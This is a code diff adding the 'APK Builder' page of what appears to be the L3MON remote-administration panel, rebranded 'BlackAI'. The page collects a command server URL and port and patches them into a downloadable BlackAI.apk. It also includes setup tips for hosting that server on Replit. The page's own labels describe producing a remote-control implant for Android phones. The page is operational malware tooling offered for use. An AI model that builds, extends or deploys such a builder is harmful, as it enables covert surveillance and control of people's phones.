@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+
+<%- include('partials/head.ejs') %>
+
+
+<body>
+    <div class="ui container">
+        <%- include('partials/header.ejs') %>
+        <div class="ui segment">
+
+            <div id="dimmer" class="ui dimmer">
+                <div class="ui indeterminate text loader" id="loadingText">Submitting</div>
+            </div>
+
+            <h1 class="ui" style="text-align: center">APK Builder</h1>
+            <div class="ui info message">
+                <div class="header">Replit Deployment Setup</div>
+                <p>Enter your deployment URL (e.g., <code>blackaipyw.replit.app</code>) without <code>https://</code></p>
+                <p>Use port <strong>443</strong> for Replit deployments (HTTPS)</p>
+                <p><strong>Important:</strong> For .replit.app domains, always use port 443</p>
+            </div>
+            <div class="ui form" id="form">
+                <div class="inline fields">
+                    <div class="six wide field">
+                        <div class="ui labeled input">
+                            <div class="ui label">
+                                http://
+                            </div>
+                            <input type="text" id="uriInput" placeholder="IP / Public URL"
+                                title="This is the public url of your server (l3mon.domain.com)">
+                        </div>
+                    </div>
+                    <div class="two wide field">
+                        <label>:</label>
+                        <input type="number" id="portInput" placeholder="PORT" min="2048" max="25565"
+                            title="For production deployment, use port 3000 (external port). For dev, use <%= myPort %>" value="3000">
+                    </div>
+
+                </div>
+                <div class="inline fields">
+                    <div class="eight wide field">
+                        <button id="gobuild" class="positive ui fluid button"><i class="wrench icon"></i>Build</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="ui form" id="download" style="display: none">
+                <div class="inline fields">
+                    <div class="eight wide field">
+                        <a class="ui green button" href="/download/BlackAI.apk" download>Download</a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+    <style>
+        .inline.fields {
+            justify-content: center;
+        }
+    </style>
+
+    <script>
+        gtag('event', 'screen_view', {
+            'screen_name': 'apkBuilder',
+            'app_name': 'L3MON'
+        });
+
+        var loadingTexts = [
+            "Decompiling APK",
+            "Patching Server Information",
+            "Compiling APK",
+            "Signing APK",
+            "Verifying Build",
+            "Finalizing"
+        ];
+
+        var loadingIndex = 0;
+        var isDone = false;
+        var isDoneInterval;
+        $('#gobuild').click((e) => {
+            $('#dimmer').addClass('active');
+            build($('#uriInput').val(), $('#portInput').val());
+            setTimeout(loaderText, 500);
+        });
+
+        function loaderText() {
+            var nextTimeout = Math.floor(Math.random() * 1500) + 700;
+            $('#loadingText').text(loadingTexts[loadingIndex]);
+            loadingIndex++;
+            if (loadingIndex !== loadingTexts.length) setTimeout(loaderText, nextTimeout);
+            else isDoneInterval = setInterval(() => {
+                if (isDone) {
+                    clearInterval(isDoneInterval);
+                    isDone = false;
+                    $('#dimmer').fadeOut(500, () => {
+                        $('#download').removeClass('active');
+                    })
+                    $('#form').fadeOut(500, () => {
+                        $('#download').fadeIn(200);
+                    })
+                }
+            }, 100);
+        }
+
+        function build(URI, PORT) {
+            gtag('event', 'build', {
+                'builduri': URI + ':' + PORT
+            });
+            $.post("/builder?uri=" + URI + "&port=" + PORT, function (data) {
+                if (!data.error) {
+                    isDone = true
+                } else showNotification('#f03434', data.error)
+            });
+        }
+
+    </script>
+    <%- include('partials/footer.ejs') %>
+</body>
+
+</html>
